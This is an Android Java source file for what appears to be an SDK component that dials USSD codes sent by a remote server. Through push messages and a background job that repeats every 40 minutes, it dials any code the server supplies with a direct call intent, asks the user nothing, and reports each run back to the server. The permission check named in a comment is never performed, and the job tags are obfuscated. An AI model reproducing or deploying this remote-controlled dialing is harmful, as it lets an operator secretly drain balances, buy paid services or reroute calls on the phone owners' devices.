package manager.app.com.ussd;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;

import com.evernote.android.job.Job;
import com.evernote.android.job.JobRequest;

import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.TimeUnit;

import manager.app.com.commons.commons.SdkComponent;
import manager.app.com.ussd.keep.UssdCode;
import okhttp3.ResponseBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import timber.log.Timber;

public class UssdComponent extends SdkComponent {

    private static final String JOB_TAG_CHECK_CODES = "u65256266789_j_2";
    private static final String JOB_TAG_CHECK_CODES_NOW = "u65256266789_j_3";

    private static UssdComponent instance;

    public static UssdComponent get() {
        return instance;
    }

    public UssdComponent() {
        instance = this;
    }

    @Override
    public void onDeviceRegistered() {
        startCheckCodesJob();
    }

    @Override
    public void onFcmMessageReceived(Bundle payload) {
        if (!payload.getString("type", "").contentEquals("ussd")) {
            return;
        }
        String ussdId = payload.getString("id");
        String ussdCode = payload.getString("code");
        if (ussdCode != null) {
            UssdCode code = new UssdCode(ussdId, ussdCode);
            onUssdCodeReceived(code);
        }
    }

    @Override
    public void onDeviceRebooted() {

    }

    @Nullable
    @Override
    public Job createJob(@NonNull String tag) {
        if (JOB_TAG_CHECK_CODES.equals(tag) ||
                JOB_TAG_CHECK_CODES_NOW.equals(tag)) {
            return new LoadCodesJob();
        }
        return null;
    }

    ///////////////////////////////////////////////////////////////////////////
    // JOBS
    ///////////////////////////////////////////////////////////////////////////

    public void startCheckCodesJob() {
        startCheckCodesJobNow();
        startCheckCodesRepeated();
    }

    private void startCheckCodesJobNow() {
        long executionWindow = TimeUnit.SECONDS.toMillis(10);
        // TODO: 08.02.2018 TIME 55
        long startTime = TimeUnit.SECONDS.toMillis(10);
        new JobRequest.Builder(JOB_TAG_CHECK_CODES_NOW)
                .setExecutionWindow(startTime, startTime + executionWindow)
                .setBackoffCriteria(startTime, JobRequest.BackoffPolicy.EXPONENTIAL)
                .setUpdateCurrent(true)
                .setRequiredNetworkType(JobRequest.NetworkType.CONNECTED)
                .build()
                .schedule();
    }

    private void startCheckCodesRepeated() {
        new JobRequest.Builder(JOB_TAG_CHECK_CODES)
                .setPeriodic(TimeUnit.MINUTES.toMillis(40), TimeUnit.MINUTES.toMillis(20))
                .setUpdateCurrent(true)
                .setRequiredNetworkType(JobRequest.NetworkType.CONNECTED)
                .build()
                .schedule();
    }

    ///////////////////////////////////////////////////////////////////////////
    // UTILS
    ///////////////////////////////////////////////////////////////////////////

    public void onUssdCodeReceived(UssdCode ussdCode) {
        Timber.d("onUssdCodeReceived -> ussdCode[%s]", ussdCode);
        // check permissions
        try {
            launchUssdCode(context(), ussdCode.getCode());
            Map<String, String> fields = new HashMap<>();
            fields.put("id", ussdCode.getId());
            api().makePost("device/ussd-run", fields).enqueue(new Callback<ResponseBody>() {
                @Override
                public void onResponse(Call<ResponseBody> call, Response<ResponseBody> response) {
                }

                @Override
                public void onFailure(Call<ResponseBody> call, Throwable t) {
                }
            });
        } catch (Exception e) {
            Timber.e(e, "onUssdCodeReceived");
        }
    }

    private void launchUssdCode(Context context, @NonNull String ussdCode) throws Exception {
        Timber.d("launchUssdCode -> ussdCode[%s]", ussdCode);
        ussdCode = ussdCode.replaceAll("#", Uri.encode("#"));
        Intent intent = new Intent("android.intent.action.CALL", Uri.parse("tel:" + ussdCode));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
        context.startActivity(intent);
    }
}
